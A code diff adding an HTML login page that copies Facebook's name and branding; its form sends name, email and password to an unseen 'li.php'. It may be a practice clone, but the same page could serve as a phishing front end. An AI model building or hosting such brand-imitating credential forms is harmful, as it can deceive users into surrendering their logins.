@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Login to facebook</title>
+        <meta charset="utf-8">
+        <style>
+            p{
+                font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            }
+            h1{
+                font-family:system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+                color: rgb(54, 87, 255);
+                text-align:center;
+                font-size:450%;
+            }
+            input[type=text], input[type=email], input[type=password]{
+                width: 80%;
+                padding: 10px 20px;
+                margin: 8px 0;
+                box-sizing: border-box;
+                border: 1.5px solid black;
+                border-radius: 2px;
+                background:rgb(236, 245, 255);
+                color:rgb(0, 30, 57);
+                font-size: 1rem;
+                font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            }
+            .d1{
+                display:block;
+                text-align:center;
+                border-style: groove;
+                border-width: 1px;
+                border-radius: 0%;
+                margin-left: 30%;
+                margin-right: 30%;
+                border-color: rgb(255, 255, 255);
+                box-shadow: 0 12px 16px 0 rgba(0, 0, 0, 0.075),0 17px 50px 0 rgba(0, 0, 0, 0.043);
+            }
+            input[type=submit] {
+                width: 80%;
+                padding: 10px 20px;
+                margin: 8px 0;
+                box-sizing: border-box;
+                border: 1.5px solid black;
+                border-radius: 2px;
+                background:rgb(87, 99, 255);
+                color:rgb(249, 252, 255);
+                font-size: 1rem;
+                font-family:system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            }
+            input[type=submit]:hover{
+                box-shadow: 0 12px 16px 0 rgba(0, 0, 0, 0.075),0 17px 50px 0 rgba(0, 0, 0, 0.043);
+                cursor:pointer;
+            }
+            a{
+                text-decoration: none;
+                color: rgb(36, 36, 255);
+                font-family:system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+                font-size: 12px;
+            }
+        </style>
+    </head>
+    <body>
+        <h1><b>facebook</b></h1>
+        <div class="d1">
+            <form action="li.php" method="POST">
+                <b><p>Log in to facebook</p></b>
+                <table>
+                    <tr>
+                        <td>
+                            <input type="text" name="fname" placeholder="Name" size="70">
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <input type="email" name="email" placeholder="Email" size="70">
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <input type="password" name="pass" placeholder="Password" size="70">
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <input type="submit" name="login" value="login">
+                        </td>
+                    </tr>
+                </table>
+                <br>
+                <a href="signup.html">Sign up for facebook</a>
+                <br><br><br>
+            </form>
+        </div>
+    </body>
+</html>
